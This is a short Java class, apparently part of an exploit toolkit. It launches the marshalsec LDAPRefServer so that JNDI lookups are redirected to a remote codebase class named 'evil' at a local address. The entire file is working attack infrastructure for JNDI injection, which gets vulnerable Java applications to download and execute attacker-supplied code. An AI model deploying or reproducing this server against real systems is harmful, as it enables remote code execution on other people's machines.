package org.payload.jndi.ldap;

import marshalsec.jndi.LDAPRefServer;

public class testServer {
    public static void main(String[] args){
        marshalsec.jndi.LDAPRefServer.main(new String[]{"http://127.0.0.1/#evil"});
    }
}
